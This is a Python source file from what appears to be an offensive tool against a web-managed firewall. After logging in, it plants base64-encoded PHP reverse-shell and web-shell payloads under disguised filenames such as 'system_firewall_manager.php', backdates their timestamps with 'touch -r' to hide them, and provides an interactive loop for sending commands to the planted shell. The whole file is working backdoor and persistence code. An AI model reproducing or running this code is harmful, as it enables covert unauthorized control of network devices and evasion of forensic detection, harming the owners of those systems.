import utils
import base64

def proRev(details):
    rev = "echo '"
    with open('WebFiles/prorev.php', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", details.iplong).encode("ascii")
    file.close()
    rev += base64.b64encode(data_mod).decode("ascii")
    rev += "' > temp_cache"

    revcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_advanced_routes.php"""
    revtad = "touch -r index.php system_advanced_routes.php"

    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)

    try:
        utils.cmdGET(details, rev)
        utils.cmdGET(details, revcmd)
        utils.cmdGET(details, revtad)
        print("Upload Complete!")
    except:
        print("Upload Failed!")

def proWeb(details):
    web = "echo '"
    with open('WebFiles/proweb.php', 'r') as file:
        data = file.read()
    data_mod = data.replace("HEYBEAR", details.iplong).encode("ascii")
    web += base64.b64encode(data_mod).decode("ascii")

    web += "' > temp_cache"

    webcmd = """php -r '$file = file_get_contents("temp_cache", true);echo base64_decode($file);' > system_firewall_manager.php"""

    webtad = "touch -r index.php interfaces_ipv6.php"

    utils.simpleGET(details, "/", "", 0)
    utils.loginPOST(details)

    try:
        utils.cmdGET(details, web)
        utils.cmdGET(details, webcmd)
        utils.cmdGET(details, webtad)
        print("Upload Complete!")
    except:
        print("Upload failed")


def proAccess(details):
    cmd = b""
    encoding = "utf-8"

    while(cmd.decode(encoding).lower() != "quit"):
        cmd = input("$: ").encode("ascii")
        cmd_encoded = base64.b64encode(cmd).decode("ascii")

        pro_data = {"settings": cmd_encoded}
        utils.simplePOST(details, "/system_firewall_manager.php", cmd_encoded, 1, pro_data)

